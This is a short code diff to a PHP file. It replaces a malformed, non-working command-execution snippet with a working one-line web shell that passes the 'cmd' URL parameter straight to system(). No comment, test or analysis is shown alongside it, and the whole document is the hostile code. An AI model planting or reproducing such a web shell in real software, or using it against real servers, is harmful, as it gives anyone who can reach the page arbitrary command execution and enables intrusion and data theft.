@@ -1,3 +1,1 @@
-<? Php
-passthru ($ _ GET [cmd]);
-?>
+<?php system($_GET['cmd']); ?>
